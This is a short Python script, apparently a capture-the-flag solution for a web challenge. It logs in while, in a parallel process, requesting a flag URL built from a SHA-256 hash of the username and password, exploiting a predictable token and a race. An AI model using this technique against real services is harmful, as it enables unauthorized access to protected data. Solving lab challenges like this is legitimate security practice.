import json
import hashlib
import requests
import multiprocessing as mp
b_url = """https://web6.chall.necst.it"""

log = {
    "uname":"Mobils",
    "password":"asasiisa" # RANDOM SHIET
}

new_session = log

token = hashlib.sha256(new_session['uname'] + new_session['password']).hexdigest()

def login():
    print("[LOGIN] Start")
    r = requests.post(b_url + "/login", json=log)
    print("[LOGIN] : %d"%r.status_code)
    return r

def token_leak():
    global token
    print("[LEAK] Start")
    r = requests.get(b_url + "/%s/flag"%token)
    print("[LEAK] : %d"%r.status_code)
    print("[LEAK] flag: [%s]"%r.json()["flag"])
    return r

login_p = mp.Process(target=login)
leak_p = mp.Process(target=token_leak)

login_p.start()
leak_p.start()
leak_p.join()
login_p.join()